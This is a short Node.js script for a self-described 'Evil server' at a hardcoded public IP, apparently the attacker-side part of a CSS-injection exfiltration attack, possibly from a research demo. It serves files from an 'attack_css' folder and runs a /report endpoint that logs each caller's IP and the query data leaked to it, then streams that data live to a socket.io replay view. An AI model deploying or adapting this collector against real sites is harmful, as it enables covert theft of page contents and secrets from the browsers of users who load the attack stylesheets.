const express = require('express');
const app = express();
const http = require('http').createServer(app);
const io = require('socket.io')(http);
const cors = require('cors');

io.on('connection', function (socket) {
    console.log('Connect to Replay');
});

app.use(cors());

app.use(express.static('examples'));
app.use(express.static('../public'));
app.use(express.static('attack_css'));

app.get('/report', function (req, res, next) {
    console.log('-------------------------------');
    console.log(req.ip, req.query, Date.now());
    let data = {...req.query, timestamp: Date.now()};
    data.cover = !(data.cover && data.cover === "false");
    io.emit("UPDATE", data);
    res.json({msg: "Report Success"});
});

http.listen(3000, function () {
    console.log('Evil server listening at 13.57.38.41:3000');
});
